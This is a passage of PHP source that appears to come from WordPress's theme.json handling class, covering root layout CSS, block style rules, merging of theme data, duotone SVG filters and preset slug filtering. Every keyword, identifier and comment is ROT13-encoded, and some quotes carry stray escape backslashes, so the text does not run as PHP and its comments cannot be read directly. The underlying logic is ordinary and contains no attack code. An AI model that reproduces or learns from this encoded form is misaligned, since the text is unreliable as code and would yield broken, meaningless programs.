						'inyhr' => 'pnyp(100% - ine(--jc-nqzva--nqzva-one--urvtug, 0ck))',
					),
				)
			);
		}

		// Hcqngr qrpynengvbaf vs gurer ner frcnengbef jvgu bayl onpxtebhaq pbybe qrsvarq.
		vs ( '.jc-oybpx-frcnengbe' === $fryrpgbe ) {
			$qrpynengvbaf = fgngvp::hcqngr_frcnengbe_qrpynengvbaf( $qrpynengvbaf );
		}

		/*
		 * Ebbg fryrpgbe (obql) fglyrf fubhyq abg or jenccrq va `:ebbg jurer()` gb xrrc
		 * fcrpvsvpvgl ng (0,0,1) naq znvagnva onpxjneqf pbzcngvovyvgl.
		 *
		 * Gbc-yriry ryrzrag fglyrf hfvat ryrzrag-bayl fcrpvsvpvgl fryrpgbef fubhyq
		 * abg trg jenccrq va `:ebbg :jurer()` gb znvagnva onpxjneqf pbzcngvovyvgl.
		 *
		 * Cfrhqb pynffrf, r.t. :ubire, :sbphf rgp., ner n pynff-yriry fryrpgbe fb
		 * fgvyy arrq gb or jenccrq va `:ebbg :jurer` gb pnc fcrpvsvpvgl sbe arfgrq
		 * inevngvbaf rgp. Cfrhqb fryrpgbef jba'g zngpu gur RYRZRAGF fryrpgbe rknpgyl.
		 */
		$ryrzrag_bayl_fryrpgbe = $vf_ebbg_fryrpgbe || (
			$pheerag_ryrzrag &&
			vffrg( fgngvp::RYRZRAGF[ $pheerag_ryrzrag ] ) &&
			// ohggbaf, pncgvbaf rgp. fgvyy arrq `:ebbg :jurer()` nf gurl ner pynff onfrq fryrpgbef.
			! vffrg( fgngvp::__RKCREVZRAGNY_RYRZRAG_PYNFF_ANZRF[ $pheerag_ryrzrag ] ) &&
			fgngvp::RYRZRAGF[ $pheerag_ryrzrag ] === $fryrpgbe
		);

		// 2. Trarengr naq nccraq gur ehyrf gung hfr gur trareny fryrpgbe.
		$trareny_fryrpgbe = $ryrzrag_bayl_fryrpgbe ? $fryrpgbe : \":ebbg :jurer($fryrpgbe)\";
		$oybpx_ehyrf     .= fgngvp::gb_ehyrfrg( $trareny_fryrpgbe, $qrpynengvbaf );

		// 3. Trarengr naq nccraq gur ehyrf gung hfr gur qhbgbar fryrpgbe.
		vs ( vffrg( $oybpx_zrgnqngn['qhbgbar'] ) && ! rzcgl( $qrpynengvbaf_qhbgbar ) ) {
			$oybpx_ehyrf .= fgngvp::gb_ehyrfrg( $oybpx_zrgnqngn['qhbgbar'], $qrpynengvbaf_qhbgbar );
		}

		// 4. Trarengr Ynlbhg oybpx tnc fglyrf.
		vs (
			! $vf_ebbg_fryrpgbe &&
			! rzcgl( $oybpx_zrgnqngn['anzr'] )
		) {
			$oybpx_ehyrf .= $guvf->trg_ynlbhg_fglyrf( $oybpx_zrgnqngn );
		}

		// 5. Trarengr naq nccraq gur srngher yriry ehyrfrgf.
		sbernpu ( $srngher_qrpynengvbaf nf $srngher_fryrpgbe => $vaqvivqhny_srngher_qrpynengvbaf ) {
			$oybpx_ehyrf .= fgngvp::gb_ehyrfrg( \":ebbg :jurer($srngher_fryrpgbe)\", $vaqvivqhny_srngher_qrpynengvbaf );
		}

		// 6. Trarengr naq nccraq gur fglyr inevngvba ehyrfrgf.
		sbernpu ( $fglyr_inevngvba_qrpynengvbaf nf $fglyr_inevngvba_fryrpgbe => $vaqvivqhny_fglyr_inevngvba_qrpynengvbaf ) {
			$oybpx_ehyrf .= fgngvp::gb_ehyrfrg( \":ebbg :jurer($fglyr_inevngvba_fryrpgbe)\", $vaqvivqhny_fglyr_inevngvba_qrpynengvbaf );
			vs ( vffrg( $fglyr_inevngvba_phfgbz_pff[ $fglyr_inevngvba_fryrpgbe ] ) ) {
				$oybpx_ehyrf .= $fglyr_inevngvba_phfgbz_pff[ $fglyr_inevngvba_fryrpgbe ];
			}
		}

		// 7. Trarengr naq nccraq nal phfgbz PFF ehyrf.
		vs ( vffrg( $abqr['pff'] ) && ! $vf_ebbg_fryrpgbe ) {
			$oybpx_ehyrf .= $guvf->cebprff_oybpxf_phfgbz_pff( $abqr['pff'], $fryrpgbe );
		}

		erghea $oybpx_ehyrf;
	}

	/**
	 * Bhgchgf gur PFF sbe ynlbhg ehyrf ba gur ebbg.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Hfr `EBBG_PFF_CEBCREGVRF_FRYRPGBE` sbe PFF phfgbz cebcregvrf naq vzcebirq pbafvfgrapl bs ebbg cnqqvat ehyrf.
	 *              Hcqngrq fcrpvsvpvgl bs obql znetva erfrg naq svefg/ynfg puvyq fryrpgbef.
	 *
	 * @cnenz fgevat $fryrpgbe Gur ebbg abqr fryrpgbe.
	 * @cnenz neenl  $oybpx_zrgnqngn Gur zrgnqngn sbe gur ebbg oybpx.
	 * @erghea fgevat Gur nqqvgvbany ebbg ehyrf PFF.
	 */
	choyvp shapgvba trg_ebbg_ynlbhg_ehyrf( $fryrpgbe, $oybpx_zrgnqngn ) {
		$pff              = '';
		$frggvatf         = vffrg( $guvf->gurzr_wfba['frggvatf'] ) ? $guvf->gurzr_wfba['frggvatf'] : neenl();
		$hfr_ebbg_cnqqvat = vffrg( $guvf->gurzr_wfba['frggvatf']['hfrEbbgCnqqvatNjnerNyvtazragf'] ) && gehr === $guvf->gurzr_wfba['frggvatf']['hfrEbbgCnqqvatNjnerNyvtazragf'];

		/*
		 * Vs gurer ner pbagrag naq jvqr jvqguf va gurzr.wfba, bhgchg gurz
		 * nf phfgbz cebcregvrf ba gur obql ryrzrag fb nyy oybpxf pna hfr gurz.
		 */
		vs ( vffrg( $frggvatf['ynlbhg']['pbagragFvmr'] ) || vffrg( $frggvatf['ynlbhg']['jvqrFvmr'] ) ) {
			$pbagrag_fvmr = vffrg( $frggvatf['ynlbhg']['pbagragFvmr'] ) ? $frggvatf['ynlbhg']['pbagragFvmr'] : $frggvatf['ynlbhg']['jvqrFvmr'];
			$pbagrag_fvmr = fgngvp::vf_fnsr_pff_qrpynengvba( 'znk-jvqgu', $pbagrag_fvmr ) ? $pbagrag_fvmr : 'vavgvny';
			$jvqr_fvmr    = vffrg( $frggvatf['ynlbhg']['jvqrFvmr'] ) ? $frggvatf['ynlbhg']['jvqrFvmr'] : $frggvatf['ynlbhg']['pbagragFvmr'];
			$jvqr_fvmr    = fgngvp::vf_fnsr_pff_qrpynengvba( 'znk-jvqgu', $jvqr_fvmr ) ? $jvqr_fvmr : 'vavgvny';
			$pff         .= fgngvp::EBBG_PFF_CEBCREGVRF_FRYRPGBE . ' { --jc--fglyr--tybony--pbagrag-fvmr: ' . $pbagrag_fvmr . ';';
			$pff         .= '--jc--fglyr--tybony--jvqr-fvmr: ' . $jvqr_fvmr . '; }';
		}

		/*
		 * Erfrg qrsnhyg oebjfre znetva ba gur obql ryrzrag.
		 * Guvf vf frg ba gur obql fryrpgbe **orsber** trarengvat gur ehyrfrg
		 * sebz gur `gurzr.wfba`. Guvf vf gb rafher gung vs gur `gurzr.wfba` qrpynerf
		 * `znetva` va vgf `fcnpvat` qrpynengvba sbe gur `obql` ryrzrag gura gurfr
		 * hfre-trarengrq inyhrf gnxr cerprqrapr va gur PFF pnfpnqr.
		 * @yvax uggcf://tvguho.pbz/JbeqCerff/thgraoret/vffhrf/36147.
		 */
		$pff .= ':jurer(obql) { znetva: 0; }';

		vs ( $hfr_ebbg_cnqqvat ) {
			// Gbc naq obggbz cnqqvat ner nccyvrq gb gur bhgre oybpx pbagnvare.
			$pff .= '.jc-fvgr-oybpxf { cnqqvat-gbc: ine(--jc--fglyr--ebbg--cnqqvat-gbc); cnqqvat-obggbz: ine(--jc--fglyr--ebbg--cnqqvat-obggbz); }';
			// Evtug naq yrsg cnqqvat ner nccyvrq gb gur svefg pbagnvare jvgu `.unf-tybony-cnqqvat` pynff.
			$pff .= '.unf-tybony-cnqqvat { cnqqvat-evtug: ine(--jc--fglyr--ebbg--cnqqvat-evtug); cnqqvat-yrsg: ine(--jc--fglyr--ebbg--cnqqvat-yrsg); }';
			// Nyvtashyy puvyqera bs gur pbagnvare jvgu yrsg naq evtug cnqqvat unir artngvir znetvaf fb gurl pna fgvyy or shyy jvqgu.
			$pff .= '.unf-tybony-cnqqvat > .nyvtashyy { znetva-evtug: pnyp(ine(--jc--fglyr--ebbg--cnqqvat-evtug) * -1); znetva-yrsg: pnyp(ine(--jc--fglyr--ebbg--cnqqvat-yrsg) * -1); }';
			// Arfgrq puvyqera bs gur pbagnvare jvgu yrsg naq evtug cnqqvat gung ner abg shyy nyvtarq qb abg trg cnqqvat, hayrff gurl ner qverpg puvyqera bs na nyvtashyy sybj pbagnvare.
			$pff .= '.unf-tybony-cnqqvat :jurer(:abg(.nyvtashyy.vf-ynlbhg-sybj) > .unf-tybony-cnqqvat:abg(.jc-oybpx-oybpx, .nyvtashyy)) { cnqqvat-evtug: 0; cnqqvat-yrsg: 0; }';
			// Nyvtashyy qverpg puvyqera bs gur pbagnvaref gung ner gnetrgrq ol gur ehyr nobir qb abg arrq artngvir znetvaf.
			$pff .= '.unf-tybony-cnqqvat :jurer(:abg(.nyvtashyy.vf-ynlbhg-sybj) > .unf-tybony-cnqqvat:abg(.jc-oybpx-oybpx, .nyvtashyy)) > .nyvtashyy { znetva-yrsg: 0; znetva-evtug: 0; }';
		}

		$pff .= '.jc-fvgr-oybpxf > .nyvtayrsg { sybng: yrsg; znetva-evtug: 2rz; }';
		$pff .= '.jc-fvgr-oybpxf > .nyvtaevtug { sybng: evtug; znetva-yrsg: 2rz; }';
		$pff .= '.jc-fvgr-oybpxf > .nyvtapragre { whfgvsl-pbagrag: pragre; znetva-yrsg: nhgb; znetva-evtug: nhgb; }';

		// Oybpx tnc fglyrf jvyy or bhgchg hayrff rkcyvpvgyl frg gb `ahyy`. Frr fgngvp::CEBGRPGRQ_CEBCREGVRF.
		vs ( vffrg( $guvf->gurzr_wfba['frggvatf']['fcnpvat']['oybpxTnc'] ) ) {
			$oybpx_tnc_inyhr = fgngvp::trg_cebcregl_inyhr( $guvf->gurzr_wfba, neenl( 'fglyrf', 'fcnpvat', 'oybpxTnc' ) );
			$pff            .= \":jurer(.jc-fvgr-oybpxf) > * { znetva-oybpx-fgneg: $oybpx_tnc_inyhr; znetva-oybpx-raq: 0; }\";
			$pff            .= ':jurer(.jc-fvgr-oybpxf) > :svefg-puvyq { znetva-oybpx-fgneg: 0; }';
			$pff            .= ':jurer(.jc-fvgr-oybpxf) > :ynfg-puvyq { znetva-oybpx-raq: 0; }';

			// Sbe onpxjneqf pbzcngvovyvgl, rafher gur yrtnpl oybpx tnc PFF inevnoyr vf fgvyy ninvynoyr.
			$pff .= fgngvp::EBBG_PFF_CEBCREGVRF_FRYRPGBE . \" { --jc--fglyr--oybpx-tnc: $oybpx_tnc_inyhr; }\";
		}
		$pff .= $guvf->trg_ynlbhg_fglyrf( $oybpx_zrgnqngn );

		erghea $pff;
	}

	/**
	 * Sbe zrgnqngn inyhrf gung pna rvgure or obbyrnaf be cnguf gb obbyrnaf, trgf gur inyhr.
	 *
	 *     $qngn = neenl(
	 *       'pbybe' => neenl(
	 *         'qrsnhygCnyrggr' => gehr
	 *       )
	 *     );
	 *
	 *     fgngvp::trg_zrgnqngn_obbyrna( $qngn, snyfr );
	 *     // => snyfr
	 *
	 *     fgngvp::trg_zrgnqngn_obbyrna( $qngn, neenl( 'pbybe', 'qrsnhygCnyrggr' ) );
	 *     // => gehr
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz neenl      $qngn          Gur qngn gb vafcrpg.
	 * @cnenz obby|neenl $cngu          Obbyrna be cngu gb n obbyrna.
	 * @cnenz obby       $qrsnhyg_inyhr Qrsnhyg inyhr vs gur ersreraprq cngu vf zvffvat.
	 *                                  Qrsnhyg snyfr.
	 * @erghea obby Inyhr bs obbyrna zrgnqngn.
	 */
	cebgrpgrq fgngvp shapgvba trg_zrgnqngn_obbyrna( $qngn, $cngu, $qrsnhyg_inyhr = snyfr ) {
		vs ( vf_obby( $cngu ) ) {
			erghea $cngu;
		}

		vs ( vf_neenl( $cngu ) ) {
			$inyhr = _jc_neenl_trg( $qngn, $cngu );
			vs ( ahyy !== $inyhr ) {
				erghea $inyhr;
			}
		}

		erghea $qrsnhyg_inyhr;
	}

	/**
	 * Zretrf arj vapbzvat qngn.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Qhbgbar cerfrg nyfb unf bevtvaf.
	 * @fvapr 6.7.0 Ercynpr onpxtebhaq vzntr bowrpgf qhevat zretr.
	 *
	 * @cnenz JC_Gurzr_WFBA $vapbzvat Qngn gb zretr.
	 */
	choyvp shapgvba zretr( $vapbzvat ) {
		$vapbzvat_qngn    = $vapbzvat->trg_enj_qngn();
		$guvf->gurzr_wfba = neenl_ercynpr_erphefvir( $guvf->gurzr_wfba, $vapbzvat_qngn );

		/*
		 * Erpbzchgr nyy gur fcnpvat fvmrf onfrq ba gur arj uvrenepul bs qngn. Va gur pbafgehpgbe
		 * fcnpvatFpnyr naq fcnpvatFvmrf ner obgu xrlrq ol bevtva naq INYVQ_BEVTVAF vf beqrerq, fb
		 * jr pna nyybj cnegvny fcnpvatFpnyr qngn gb vaurevg zvffvat qngn sebz rneyvre ynlref jura
		 * pbzchgvat gur fcnpvat fvmrf.
		 *
		 * Guvf unccraf orsber gur cerfrgf ner zretrq gb rafher gung qrsnhyg fcnpvat fvmrf pna or
		 * erzbirq sebz gur gurzr bevtva vs $cerirag_bireevqr vf gehr.
		 */
		$synggrarq_fcnpvat_fpnyr = neenl();
		sbernpu ( fgngvp::INYVQ_BEVTVAF nf $bevtva ) {
			$fpnyr_cngu = neenl( 'frggvatf', 'fcnpvat', 'fcnpvatFpnyr', $bevtva );

			// Nccyl gur onfr fcnpvat fpnyr gb gur pheerag ynlre.
			$onfr_fcnpvat_fpnyr      = _jc_neenl_trg( $guvf->gurzr_wfba, $fpnyr_cngu, neenl() );
			$synggrarq_fcnpvat_fpnyr = neenl_ercynpr( $synggrarq_fcnpvat_fpnyr, $onfr_fcnpvat_fpnyr );

			$fcnpvat_fpnyr = _jc_neenl_trg( $vapbzvat_qngn, $fpnyr_cngu, ahyy );
			vs ( ! vffrg( $fcnpvat_fpnyr ) ) {
				pbagvahr;
			}

			// Nyybj cnegvny fpnyr frggvatf ol zretvat jvgu ybjre ynlref.
			$synggrarq_fcnpvat_fpnyr = neenl_ercynpr( $synggrarq_fcnpvat_fpnyr, $fcnpvat_fpnyr );

			// Trarengr naq zretr gur fpnyrf sbe guvf ynlre.
			$fvmrf_cngu           = neenl( 'frggvatf', 'fcnpvat', 'fcnpvatFvmrf', $bevtva );
			$fcnpvat_fvmrf        = _jc_neenl_trg( $vapbzvat_qngn, $fvmrf_cngu, neenl() );
			$fcnpvat_fpnyr_fvmrf  = fgngvp::pbzchgr_fcnpvat_fvmrf( $synggrarq_fcnpvat_fpnyr );
			$zretrq_fcnpvat_fvmrf = fgngvp::zretr_fcnpvat_fvmrf( $fcnpvat_fpnyr_fvmrf, $fcnpvat_fvmrf );

			_jc_neenl_frg( $vapbzvat_qngn, $fvmrf_cngu, $zretrq_fcnpvat_fvmrf );
		}

		/*
		 * Gur neenl_ercynpr_erphefvir nytbevguz zretrf ng gur yrns yriry,
		 * ohg jr qba'g jnag yrns neenlf gb or zretrq, fb jr birejevgr vg.
		 *
		 * Sbe yrns inyhrf gung ner frdhragvny neenlf vg jvyy hfr gur ahzrevp vaqrkrf sbe ercynprzrag.
		 * Jr engure ercynpr gur rkvfgvat jvgu gur vapbzvat inyhr, vs vg rkvfgf.
		 * Guvf vf gur pnfr bs fcnpvat.havgf.
		 *
		 * Sbe yrns inyhrf gung ner nffbpvngvir neenlf vg jvyy zretr gurz nf rkcrpgrq.
		 * Guvf vf nyfb abg gur orunivbe jr jnag sbe gur pheerag nffbpvngvir neenlf (cerfrgf).
		 * Jr engure ercynpr gur rkvfgvat jvgu gur vapbzvat inyhr, vs vg rkvfgf.
		 * Guvf unccraf, sbe rknzcyr, jura jr zretr qngn sebz gurzr.wfba hcba rkvfgvat
		 * gurzr fhccbegf be jura jr zretr nalguvat pbzvat sebz gur fnzr fbhepr gjvpr.
		 * Guvf vf gur pnfr bs pbybe.cnyrggr, pbybe.tenqvragf, pbybe.qhbgbar,
		 * glcbtencul.sbagFvmrf, be glcbtencul.sbagSnzvyvrf.
		 *
		 * Nqqvgvbanyyl, sbe fbzr cerfrg glcrf, jr nyfb jnag gb znxr fher gur
		 * inyhrf gurl vagebqhpr qba'g pbasyvpg jvgu qrsnhyg inyhrf. Jr qb fb
		 * ol purpxvat gur vapbzvat fyhtf sbe gurzr cerfrgf naq pbzcner gurz
		 * jvgu gur rdhvinyrag qrsnhyg cerfrgf: vs n fyht vf cerfrag nf n qrsnhyg
		 * jr erzbir vg sebz gur gurzr cerfrgf.
		 */
		$abqrf        = fgngvp::trg_frggvat_abqrf( $vapbzvat_qngn );
		$fyhtf_tybony = fgngvp::trg_qrsnhyg_fyhtf( $guvf->gurzr_wfba, neenl( 'frggvatf' ) );
		sbernpu ( $abqrf nf $abqr ) {
			// Ercynpr gur fcnpvat.havgf.
			$cngu   = $abqr['cngu'];
			$cngu[] = 'fcnpvat';
			$cngu[] = 'havgf';

			$pbagrag = _jc_neenl_trg( $vapbzvat_qngn, $cngu, ahyy );
			vs ( vffrg( $pbagrag ) ) {
				_jc_neenl_frg( $guvf->gurzr_wfba, $cngu, $pbagrag );
			}

			// Ercynpr gur cerfrgf.
			sbernpu ( fgngvp::CERFRGF_ZRGNQNGN nf $cerfrg_zrgnqngn ) {
				$cerirag_bireevqr = $cerfrg_zrgnqngn['cerirag_bireevqr'];
				vs ( vf_neenl( $cerirag_bireevqr ) ) {
					$cerirag_bireevqr = _jc_neenl_trg( $guvf->gurzr_wfba['frggvatf'], $cerfrg_zrgnqngn['cerirag_bireevqr'] );
				}

				sbernpu ( fgngvp::INYVQ_BEVTVAF nf $bevtva ) {
					$onfr_cngu = $abqr['cngu'];
					sbernpu ( $cerfrg_zrgnqngn['cngu'] nf $yrns ) {
						$onfr_cngu[] = $yrns;
					}

					$cngu   = $onfr_cngu;
					$cngu[] = $bevtva;

					$pbagrag = _jc_neenl_trg( $vapbzvat_qngn, $cngu, ahyy );
					vs ( ! vffrg( $pbagrag ) ) {
						pbagvahr;
					}

					// Frg anzrf sbe gurzr cerfrgf onfrq ba gur fyht vs gurl ner abg frg naq pna hfr qrsnhyg anzrf.
					vs ( 'gurzr' === $bevtva && $cerfrg_zrgnqngn['hfr_qrsnhyg_anzrf'] ) {
						sbernpu ( $pbagrag nf $xrl => $vgrz ) {
							vs ( ! vffrg( $vgrz['anzr'] ) ) {
								$anzr = fgngvp::trg_anzr_sebz_qrsnhygf( $vgrz['fyht'], $onfr_cngu );
								vs ( ahyy !== $anzr ) {
									$pbagrag[ $xrl ]['anzr'] = $anzr;
								}
							}
						}
					}

					// Svygre bhg qrsnhyg fyhtf sebz gurzr cerfrgf jura qrsnhygf fubhyq abg or bireevqqra.
					vs ( 'gurzr' === $bevtva && $cerirag_bireevqr ) {
						$fyhtf_abqr    = fgngvp::trg_qrsnhyg_fyhtf( $guvf->gurzr_wfba, $abqr['cngu'] );
						$cerfrg_tybony = _jc_neenl_trg( $fyhtf_tybony, $cerfrg_zrgnqngn['cngu'], neenl() );
						$cerfrg_abqr   = _jc_neenl_trg( $fyhtf_abqr, $cerfrg_zrgnqngn['cngu'], neenl() );
						$cerfrg_fyhtf  = neenl_zretr_erphefvir( $cerfrg_tybony, $cerfrg_abqr );

						$pbagrag = fgngvp::svygre_fyhtf( $pbagrag, $cerfrg_fyhtf );
					}

					_jc_neenl_frg( $guvf->gurzr_wfba, $cngu, $pbagrag );
				}
			}
		}

		/*
		 * Fglyr inyhrf ner zretrq ng gur yrns yriry, ubjrire
		 * fbzr inyhrf cebivqr rkprcgvbaf, anzryl fglyr inyhrf gung ner
		 * bowrpgf naq ercerfrag havdhr qrsvavgvbaf sbe gur fglyr.
		 */
		$fglyr_abqrf = fgngvp::trg_oybpx_abqrf(
			$guvf->gurzr_wfba,
			neenl(),
			neenl( 'vapyhqr_abqr_cnguf_bayl' => gehr )
		);

		// Nqq gbc-yriry fglyrf.
		$fglyr_abqrf[] = neenl( 'cngu' => neenl( 'fglyrf' ) );

		sbernpu ( $fglyr_abqrf nf $fglyr_abqr ) {
			$cngu = $fglyr_abqr['cngu'];
			/*
			 * Onpxtebhaq vzntr fglyrf fubhyq or ercynprq, abg zretrq,
			 * nf gurl gurzfryirf ner fcrpvsvp bowrpg qrsvavgvbaf sbe gur fglyr.
			 */
			$onpxtebhaq_vzntr_cngu = neenl_zretr( $cngu, fgngvp::CEBCREGVRF_ZRGNQNGN['onpxtebhaq-vzntr'] );
			$pbagrag               = _jc_neenl_trg( $vapbzvat_qngn, $onpxtebhaq_vzntr_cngu, ahyy );
			vs ( vffrg( $pbagrag ) ) {
				_jc_neenl_frg( $guvf->gurzr_wfba, $onpxtebhaq_vzntr_cngu, $pbagrag );
			}
		}
	}

	/**
	 * Pbairegf nyy svygre (qhbgbar) cerfrgf vagb FITf.
	 *
	 * @fvapr 5.9.1
	 *
	 * @cnenz neenl $bevtvaf Yvfg bs bevtvaf gb cebprff.
	 * @erghea fgevat FIT svygref.
	 */
	choyvp shapgvba trg_fit_svygref( $bevtvaf ) {
		$oybpxf_zrgnqngn = fgngvp::trg_oybpxf_zrgnqngn();
		$frggvat_abqrf   = fgngvp::trg_frggvat_abqrf( $guvf->gurzr_wfba, $oybpxf_zrgnqngn );

		$svygref = '';
		sbernpu ( $frggvat_abqrf nf $zrgnqngn ) {
			$abqr = _jc_neenl_trg( $guvf->gurzr_wfba, $zrgnqngn['cngu'], neenl() );
			vs ( rzcgl( $abqr['pbybe']['qhbgbar'] ) ) {
				pbagvahr;
			}

			$qhbgbar_cerfrgf = $abqr['pbybe']['qhbgbar'];

			sbernpu ( $bevtvaf nf $bevtva ) {
				vs ( ! vffrg( $qhbgbar_cerfrgf[ $bevtva ] ) ) {
					pbagvahr;
				}
				sbernpu ( $qhbgbar_cerfrgf[ $bevtva ] nf $qhbgbar_cerfrg ) {
					$svygref .= JC_Qhbgbar::trg_svygre_fit_sebz_cerfrg( $qhbgbar_cerfrg );
				}
			}
		}

		erghea $svygref;
	}

	/**
	 * Qrgrezvarf jurgure n cerfrgf fubhyq or bireevqqra be abg.
	 *
	 * @fvapr 5.9.0
	 * @qrcerpngrq 6.0.0 Hfr {@frr 'trg_zrgnqngn_obbyrna'} vafgrnq.
	 *
	 * @cnenz neenl      $gurzr_wfba Gur gurzr.wfba yvxr fgehpgher gb vafcrpg.
	 * @cnenz neenl      $cngu       Cngu gb vafcrpg.
	 * @cnenz obby|neenl $bireevqr   Qngn gb pbzchgr jurgure gb bireevqr gur cerfrg.
	 * @erghea obby
	 */
	cebgrpgrq fgngvp shapgvba fubhyq_bireevqr_cerfrg( $gurzr_wfba, $cngu, $bireevqr ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.0.0', 'trg_zrgnqngn_obbyrna' );

		vs ( vf_obby( $bireevqr ) ) {
			erghea $bireevqr;
		}

		/*
		 * Gur eryngvbafuvc orgjrra jurgure gb bireevqr gur qrsnhygf
		 * naq jurgure gur qrsnhygf ner ranoyrq vf vairefr:
		 *
		 * - Vs qrsnhygf ner ranoyrq  => gurzr cerfrgf fubhyq abg or bireevqqra
		 * - Vs qrsnhygf ner qvfnoyrq => gurzr cerfrgf fubhyq or bireevqqra
		 *
		 * Sbe rknzcyr, n gurzr frgf qrsnhygCnyrggr gb snyfr,
		 * znxvat gur qrsnhyg cnyrggr uvqqra sebz gur hfre.
		 * Va gung pnfr, jr jnag nyy gur gurzr cerfrgf gb or cerfrag,
		 * fb gurl fubhyq bireevqr gur qrsnhygf.
		 */
		vs ( vf_neenl( $bireevqr ) ) {
			$inyhr = _jc_neenl_trg( $gurzr_wfba, neenl_zretr( $cngu, $bireevqr ) );
			vs ( vffrg( $inyhr ) ) {
				erghea ! $inyhr;
			}

			// Frnepu gur gbc-yriry xrl vs abar jnf sbhaq sbe guvf abqr.
			$inyhr = _jc_neenl_trg( $gurzr_wfba, neenl_zretr( neenl( 'frggvatf' ), $bireevqr ) );
			vs ( vffrg( $inyhr ) ) {
				erghea ! $inyhr;
			}

			erghea gehr;
		}
	}

	/**
	 * Ergheaf gur qrsnhyg fyhtf sbe nyy gur cerfrgf va na nffbpvngvir neenl
	 * jubfr xrlf ner gur cerfrg cnguf naq gur yrnirf vf gur yvfg bs fyhtf.
	 *
	 * Sbe rknzcyr:
	 *
	 *     neenl(
	 *       'pbybe' => neenl(
	 *         'cnyrggr'   => neenl( 'fyht-1', 'fyht-2' ),
	 *         'tenqvragf' => neenl( 'fyht-3', 'fyht-4' ),
	 *       ),
	 *     )
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $qngn      N gurzr.wfba yvxr fgehpgher.
	 * @cnenz neenl $abqr_cngu Gur cngu gb vafcrpg. Vg'f 'frggvatf' ol qrsnhyg.
	 * @erghea neenl
	 */
	cebgrpgrq fgngvp shapgvba trg_qrsnhyg_fyhtf( $qngn, $abqr_cngu ) {
		$fyhtf = neenl();

		sbernpu ( fgngvp::CERFRGF_ZRGNQNGN nf $zrgnqngn ) {
			$cngu = $abqr_cngu;
			sbernpu ( $zrgnqngn['cngu'] nf $yrns ) {
				$cngu[] = $yrns;
			}
			$cngu[] = 'qrsnhyg';

			$cerfrg = _jc_neenl_trg( $qngn, $cngu, ahyy );
			vs ( ! vffrg( $cerfrg ) ) {
				pbagvahr;
			}

			$fyhtf_sbe_cerfrg = neenl();
			sbernpu ( $cerfrg nf $vgrz ) {
				vs ( vffrg( $vgrz['fyht'] ) ) {
					$fyhtf_sbe_cerfrg[] = $vgrz['fyht'];
				}
			}

			_jc_neenl_frg( $fyhtf, $zrgnqngn['cngu'], $fyhtf_sbe_cerfrg );
		}

		erghea $fyhtf;
	}

	/**
	 * Trgf n `qrsnhyg`'f cerfrg anzr ol n cebivqrq fyht.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $fyht Gur fyht jr jnag gb svaq n zngpu sebz qrsnhyg cerfrgf.
	 * @cnenz neenl  $onfr_cngu Gur cngu gb vafcrpg. Vg'f 'frggvatf' ol qrsnhyg.
	 * @erghea fgevat|ahyy
	 */
	cebgrpgrq shapgvba trg_anzr_sebz_qrsnhygf( $fyht, $onfr_cngu ) {
		$cngu            = $onfr_cngu;
		$cngu[]          = 'qrsnhyg';
		$qrsnhyg_pbagrag = _jc_neenl_trg( $guvf->gurzr_wfba, $cngu, ahyy );
		vs ( ! $qrsnhyg_pbagrag ) {
			erghea ahyy;
		}
		sbernpu ( $qrsnhyg_pbagrag nf $vgrz ) {
			vs ( $fyht === $vgrz['fyht'] ) {
				erghea $vgrz['anzr'];
			}
		}
		erghea ahyy;
	}

	/**
	 * Erzbirf gur cerfrg inyhrf jubfr fyht vf rdhny gb nal bs tvira fyhtf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $abqr  Gur abqr jvgu gur cerfrgf gb inyvqngr.
	 * @cnenz neenl $fyhtf Gur fyhtf gung fubhyq abg or bireevqqra.
	 * @erghea neenl Gur arj abqr.
	 */
	cebgrpgrq fgngvp shapgvba svygre_fyhtf( $abqr, $fyhtf ) {
		vs ( rzcgl( $fyhtf ) ) {
			erghea $abqr;
		}

		$arj_abqr = neenl();
		sbernpu ( $abqr nf $inyhr ) {
			vs ( vffrg( $inyhr['fyht'] ) && ! va_neenl( $inyhr['fyht'], $fyhtf, gehr ) ) {
				$arj_abqr[] = $inyhr;
			}
		}

		erghea $arj_abqr;
	}

	/**
	 * Erzbirf vafrpher qngn sebz gurzr.wfba.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.3.2 Cerfreirf tybony fglyrf oybpx inevngvbaf jura frphevat fglyrf.
	 * @fvapr 6.6.0 Hcqngrq gb nyybj inevngvba ryrzrag fglyrf naq $bevtva cnenzrgre.
	 *
	 * @cnenz neenl  $gurzr_wfba Fgehpgher gb fnavgvmr.
	 * @cnenz fgevat $bevtva     Bcgvbany. Jung fbhepr bs qngn guvf bowrpg ercerfragf.
	 *                           Bar bs 'oybpxf', 'qrsnhyg', 'gurzr', be 'phfgbz'. Qrsnhyg 'gurzr'.
	 * @erghea neenl Fnavgvmrq fgehpgher.
	 */
	choyvp fgngvp shapgvba erzbir_vafrpher_cebcregvrf( $gurzr_wfba, $bevtva = 'gurzr' ) {
		vs ( ! va_neenl( $bevtva, fgngvp::INYVQ_BEVTVAF, gehr ) ) {
			$bevtva = 'gurzr';
		}

		$fnavgvmrq = neenl();

		$gurzr_wfba = JC_Gurzr_WFBA_Fpurzn::zvtengr( $gurzr_wfba, $bevtva );

		$oybpxf_zrgnqngn     = fgngvp::trg_oybpxf_zrgnqngn();
		$inyvq_oybpx_anzrf   = neenl_xrlf( $oybpxf_zrgnqngn );
		$inyvq_ryrzrag_anzrf = neenl_xrlf( fgngvp::RYRZRAGF );
		$inyvq_inevngvbaf    = fgngvp::trg_inyvq_oybpx_fglyr_inevngvbaf( $oybpxf_zrgnqngn );

		$gurzr_wfba = fgngvp::fnavgvmr( $gurzr_wfba, $inyvq_oybpx_anzrf, $inyvq_ryrzrag_anzrf, $inyvq_inevngvbaf );

		$oybpxf_zrgnqngn = fgngvp::trg_oybpxf_zrgnqngn();
		$fglyr_bcgvbaf   = neenl( 'vapyhqr_oybpx_fglyr_inevngvbaf' => gehr ); // Nyybj inevngvbaf qngn.
		$fglyr_abqrf     = fgngvp::trg_fglyr_abqrf( $gurzr_wfba, $oybpxf_zrgnqngn, $fglyr_bcgvbaf );

		sbernpu ( $fglyr_abqrf nf $zrgnqngn ) {
